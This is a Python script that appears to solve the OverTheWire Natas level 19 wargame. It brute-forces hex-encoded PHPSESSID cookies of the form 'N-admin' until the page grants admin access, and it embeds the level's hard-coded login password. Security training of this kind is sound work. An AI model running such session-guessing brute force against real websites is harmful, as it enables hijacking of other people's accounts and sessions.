import requests

username='natas19'
password='tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
url='http://natas19.natas.labs.overthewire.org/'

for i in range(1,641):
    hex_str=(str(i)+'-admin').encode().hex()
    cookies={'PHPSESSID': hex_str}
    print('trying cookies: '+hex_str)
    response=requests.post(
        url,
        auth=(username,password),
        cookies=cookies
    )

    if "You are an admin" in response.text:
        print(response.text)
        break
    